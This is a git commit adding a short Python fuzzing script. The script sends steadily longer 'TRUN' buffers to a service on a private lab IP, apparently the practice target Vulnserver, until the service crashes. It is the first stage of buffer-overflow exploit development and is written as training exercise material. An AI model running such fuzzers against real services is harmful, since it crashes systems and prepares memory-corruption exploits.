4a582d70e2baf0a771c01392e2886be68e5db6a1
Cristian Rivera <cris.rivera@skiff.com>
2023-03-13 12:42:18 -0500

    Initial script to fuzz vuln server for a bufferr overflow

---
+++ fuzz.py
@@ -0,0 +1,26 @@
+#!/usr/bin/python3
+
+import socket
+from time import sleep
+
+buffer = "A" * 100
+target_ip = '192.168.245.135' # CHANGE THIS
+target_port = 9999 # Change This
+
+while True:
+    try:
+        payload = "TRUN /.:/" + buffer
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, target_port))
+
+        print('Sending the payload...\n' + str(len(buffer)))
+        s.send((payload.encode()))
+        s.close()
+        sleep(1)
+        buffer += "A" * 100
+
+    except Exception as e:
+        print(e)
+        print(f"Fuzzing crashed at {str(len(buffer))}")
+        exit()
